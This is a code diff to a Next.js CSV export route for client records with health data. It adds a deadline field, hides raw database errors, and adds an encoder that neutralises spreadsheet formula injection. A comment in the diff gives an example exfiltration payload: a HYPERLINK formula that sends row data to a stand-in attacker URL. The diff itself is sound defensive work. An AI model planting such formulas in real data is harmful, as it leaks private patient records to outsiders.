@@ -111,12 +111,14 @@ export async function GET(req: NextRequest) {
   const weekFromNow = new Date(Date.now() + 7 * 86400000).toISOString().split('T')[0]
   const sevenDaysAgo = new Date(Date.now() - 7 * 86400000).toISOString().split('T')[0]
 
-  // Must match the 12 deadline fields in lib/types.ts isOverdue/isDueThisWeek
+  // Must match the 13 deadline fields in lib/types.ts isOverdue/isDueThisWeek.
+  // Fix 2026-05-22: spm_next_due was missing — caused export filter counts
+  // to disagree with dashboard counts. See AUDIT_2026-05-22.md §5A.
   const deadlineFields = [
     'eligibility_end_date', 'three_month_visit_due', 'quarterly_waiver_date',
     'med_tech_redet_date', 'pos_deadline', 'assessment_due', 'thirty_day_letter_date',
     'co_financial_redet_date', 'co_app_date', 'mfp_consent_date', 'two57_date',
-    'doc_mdh_date',
+    'doc_mdh_date', 'spm_next_due',
   ]
 
   if (filter === 'overdue') {
@@ -130,7 +132,8 @@ export async function GET(req: NextRequest) {
   const { data: clients, error } = await query
 
   if (error) {
-    return NextResponse.json({ error: error.message }, { status: 500 })
+    console.error('[reports/export] DB error:', error.message)
+    return NextResponse.json({ error: 'Export failed' }, { status: 500 })
   }
 
   const rows = clients ?? []
@@ -138,13 +141,29 @@ export async function GET(req: NextRequest) {
   const headers = canSeePhi ? PHI_EXPORT_HEADERS : SAFE_EXPORT_HEADERS
   const rowMapper = canSeePhi ? phiRowToCSV : safeRowToCSV
 
-  const csvRows = [headers.join(',')]
+  /**
+   * CSV-injection-safe cell encoder.
+   *
+   * Excel/Sheets/LibreOffice treat cells starting with `= + - @ \t \r` as
+   * formulas. A PHI export that includes a client name like
+   *   =HYPERLINK("http://attacker/?p="&A1,"click")
+   * would exfiltrate the row when the CSV is opened. Prefix the cell with
+   * an apostrophe to neutralize the formula and keep the visible value
+   * intact, then quote/escape as normal RFC-4180 CSV.
+   *
+   * Fix 2026-05-22: previously cells were only quote-escaped. See
+   * AUDIT_2026-05-22.md §5A finding P1-6.
+   */
+  const FORMULA_PREFIX = /^[=+\-@\t\r]/
+  function csvCell(raw: unknown): string {
+    let s = String(raw ?? '')
+    if (FORMULA_PREFIX.test(s)) s = "'" + s
+    return `"${s.replace(/"/g, '""')}"`
+  }
+
+  const csvRows = [headers.map(csvCell).join(',')]
   for (const c of rows) {
-    csvRows.push(
-      rowMapper(c)
-        .map(v => `"${String(v).replace(/"/g, '""')}"`)
-        .join(',')
-    )
+    csvRows.push(rowMapper(c).map(csvCell).join(','))
   }
 
   const csv = csvRows.join('\n')
